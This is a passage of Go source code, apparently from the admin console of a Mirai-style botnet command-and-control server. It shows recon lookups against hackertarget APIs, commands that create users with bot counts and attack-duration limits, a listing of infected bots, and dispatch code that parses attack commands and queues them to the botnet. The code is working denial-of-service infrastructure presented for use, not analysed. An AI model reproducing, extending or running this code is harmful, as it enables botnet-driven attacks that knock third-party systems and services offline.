            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[96m: \r\n\x1b[96m" + locformatted + "\r\n"))
            }

            if err != nil || cmd == "PING" || cmd == "ping" {
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/nping/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
            }

        if err != nil || cmd == "tracer" || cmd == "TRACER" {                  
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/mtr/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 60*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[96mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
            }

        if err != nil || cmd == "resolve" || cmd == "RESOLVE" {                  
            this.conn.Write([]byte("\x1b[96mWebsite (Without www.)\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/hostsearch/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
            }

            if err != nil || cmd == "revdns" || cmd == "REVDNS" {
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/reverseiplookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
        }

            if err != nil || cmd == "asnlookup" || cmd == "asnlookup" {
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/aslookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
            }

            if err != nil || cmd == "subcalc" || cmd == "SUBCALC" {
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/subnetcalc/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
            }

            if err != nil || cmd == "ztransf" || cmd == "ZTRANSF" {
            this.conn.Write([]byte("\x1b[96mIP Address Or Website (Without www.)\x1b[0m: \x1b[96m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/zonetransfer/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
            }
            if userInfo.admin == 1 && cmd == "*ADDADMIN*" || cmd == "*addadmin*" {
            this.conn.Write([]byte("\033[0mUsername:\033[01;97m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
             this.conn.Write([]byte("\033[0mPassword:\033[01;97m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mBotcount\033[01;97m(\033[0m-1 for access to all\033[01;97m)\033[0m:\033[01;97m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[0mAttack Duration\033[01;97m(\033[0m-1 for none\033[01;97m)\033[0m:\033[01;97m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[0mCooldown\033[01;97m(\033[0m0 for none\033[01;97m)\033[0m:\033[01;97m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[0m- New user info - \r\n- Username - \033[01;97m" + new_un + "\r\n\033[0m- Password - \033[01;97m" + new_pw + "\r\n\033[0m- Bots - \033[01;97m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[01;97m" + duration_str + "\r\n\033[0m- Cooldown - \033[01;97m" + cooldown_str + "   \r\n\033[0mContinue? \033[01;97m(\033[01;91my\033[01;97m/\033[038;5;202mn\033[01;97m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "rmuser" || cmd == "RMUSER" {
            this.conn.Write([]byte("\033[038;5;202mUsername: \033[0;97m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \033[01;91mAre You Sure You Want To Remove \033[01;97m" + rm_un + "?\033[038;5;202m(\033[01;32my\033[038;5;202m/\033[038;5;202mn\033[038;5;202m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[01;91mUnable to remove users\r\n")))
            } else {
                this.conn.Write([]byte("\033[01;92mUser Successfully Removed!\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "adduser" || cmd == "ADDUSER" {
            this.conn.Write([]byte("enter new username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("enter new password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("enter wanted bot count (-1 for full net): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;91m%s\033[0m\r\n", "failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("max attack duration (-1 for none): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;91m%s\033[0m\r\n", "failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("cooldown time (0 for none): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;91m%s\033[0m\r\n", "failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("new account info: \r\nusername: " + new_un + "\r\npassword: " + new_pw + "\r\nbotcount: " + max_bots_str + "\r\nadd user to table? (y/n) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;91m%s\033[0m\r\n", "failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\x1b[38;5;202muser added successfully!\033[0m\r\n"))
            }
            continue
        }
        if userInfo.admin == 1 && cmd == "BOTS" || userInfo.admin == 1 && cmd == "bots" {
            botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202m%s: \x1b[1;97m%d\r\n", k, v)))
            }
            this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202mcount: \x1b[1;97m%d\r\n", botCount)))
            continue
        }
        if userInfo.admin == 0 && cmd == "count" || userInfo.admin == 0 && cmd == "bots" {
            this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202muserInfo.admin == 0\033[0m\r\n")))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("failed to parse botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("bot count to send is bigger than allowed bot maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
         }
        bufPos++
    }
    return string(buf), nil
}
